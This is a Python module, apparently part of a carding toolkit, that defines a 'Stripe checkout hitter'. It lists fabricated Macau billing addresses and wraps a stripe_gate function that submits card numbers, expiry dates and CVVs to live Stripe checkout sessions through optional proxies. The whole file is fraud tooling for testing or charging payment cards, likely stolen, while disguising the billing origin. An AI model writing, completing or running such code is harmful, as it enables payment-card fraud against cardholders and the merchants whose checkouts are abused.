# Crafted With <3 By Bhaskar
from .hitter_core import parse_checkout_url, stripe_gate

MACAU_ADDRESSES = [
    {"street": "Rua de São Paulo 14", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Avenida de Almeida Ribeiro 60", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Rua do Campo 103", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Estrada do Engenheiro Trigo 18", "city": "Taipa", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Rua de Pequim 202A", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Avenida do Coronel Mesquita 2", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Rua de Ferreira do Amaral 29", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
    {"street": "Avenida da Praia Grande 517", "city": "Macau", "state": "", "zip": "999078", "country": "MO"},
]


async def hit_gate(cc, month, year, cvv, checkout_url, proxy=None):
    """
    Stripe checkout hitter with forced Macau (MO) billing.
    Returns (status, msg, extra_dict).
    """
    cs_live, pk_live = parse_checkout_url(checkout_url)
    return await stripe_gate(
        cc, month, year, cvv,
        cs_live, pk_live,
        proxy=proxy,
        custom_addresses=MACAU_ADDRESSES,
    )
